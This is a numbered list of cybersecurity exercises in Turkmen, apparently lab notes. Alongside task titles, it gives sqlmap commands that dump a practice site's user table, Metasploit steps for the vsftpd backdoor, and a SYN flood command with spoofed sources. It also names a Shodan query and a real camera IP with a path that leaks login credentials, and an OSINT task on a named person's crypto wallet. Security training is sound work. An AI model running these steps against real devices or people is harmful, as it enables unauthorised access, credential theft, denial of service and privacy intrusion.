 1
Test php.Vuln.com/artists.php?artist=1
Şu salga sql injection etmeli. (kali sql map)	
Brauzer şu salgyny giriz: http://testphp.vulnweb.com/artists.php?artist=1  	
sqlmap --url http://testphp.vulnweb.com/login.php
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threats 3
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 –dbs
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -D acuart
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -D acuart --tables
sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -D acuart -T users --dump
 2
Wireshark-da vpn tunel arkaly geçýän maglumatlaryň gowşaklyklaryny tapmaly
3 
Wireshark ulanyp DNS protokolyny seljermeli gowşaklyklary anyklamaly.
4
Shodan.io IoT gowşaklyklaryny tapyp peýdalanmak(kamera açmaly).
https://vk.com/@wiwosit-ekspluatiruem-uyazvimost-kamer

Shodan-a girmeli we aşakdaky buýrugy ýazmaly...
realm="GoAhead", domain=":81" port:"81"
http://202.215.62.86:81/ yzyna şuny goş: 
system.ini?loginuse&loginpas
http://202.215.62.86:81/system.ini?loginuse&loginpas
Faýl ýüklär, şol ýerden ulanyjy adyny we paroly almaly

5
RAR faýlyň parolyny döwmeli. (LostMyPass programma).
https://www.lostmypass.com/ onlaýn döwmek üçin şu web salgy...
6
NMAP arkaly belli bir IP-nyň açyk portlaryny we gowşaklyklaryny ýüze çykarmaly.
7
Burpsuite ulgamy bilen web sahypanyň gowşaklygyny bruteforce etmeli.
8
Gmail-e gelýän hatlary diňe şu kompýuterde ýatda saklar ýaly etmeli(setting-den düzetmeli).
9
Nmap arkaly port skannirlemek we hyzmat maglumatlary
(nmap -sV -p- 192.168.0.23)

					    10
Shodan.io-de vpn-yň gowşaklyklaryny ýüze çykarmak we seljermek.
http.title:"openvpn", port:"8443"

   11
Metasploit arkaly exploit ulanmak.

   12
OSINT gurallaryny ulanmak arkaly maglumatlary ýygnamak.
(google dorking, Tin Eye Reverse Image Search, FaceCheck Reverse Image search, RevEye reverse Image Search, Whois History)


					  13
SSH açar bilen serwere birikmek.
(paroly aýyryp açar bilen girmeli,  etc/ssh/sshdconfig/digital ocean ssh key)

					  14
Metasploit FTP protokol backdoor goýmaly.

Ädimler
nmap -sV <ip_salgy>
kali linux-da: msfconsole buýrugyny ýazyp metasploit-e giriň
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <ip_salgy>
exploit ýa-da run
  15
Wireshark-da pakedi seljerip gowşaklyklary ýüze çykarmak.

 16
SSH port forwarding (Bir kompýuterden 80-nji portdan çykmaly, beýleki kompýuteriň 80-nji portyndan girmeli).
sudo ssh -L 80:localhost:80 <username>@<remote_host>

17
OSINT. Plany Planyýew kripto kaşilýogyny tapmaly. Tranzaksiýalary görmeli.
Google-da şahsyň adyny ýazsaň çykarýar ýa-da osint framework-dan peýdalanyň.
Blockchain.com Explorer.
Etherscan
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa  kripto salgy.

18
Syn Flooding paketlerini Wireshark-yň üsti bilen seljermek.
tcp.flags.syn==1 && tcp.flags.ack==0
hping3 -S -p 80 --flood --rand-source <target IP>  cmd kali yaz.

19
Linux servere ssh arkaly diňe bir IP bilen biriger ýaly etmeli, ssh arkaly başga IP-ler bilen birikmez ýaly etmeli. (UFW firewall)
Sudo su
Ufw default deny incoming
Ufw default allow outgoing
sudo ufw allow from <YOUR_IP> to any port 22
“sudo ufw deny 22” (nabelli bolmasa yazmalydyr)
sudo ufw status
sudo ufw enable
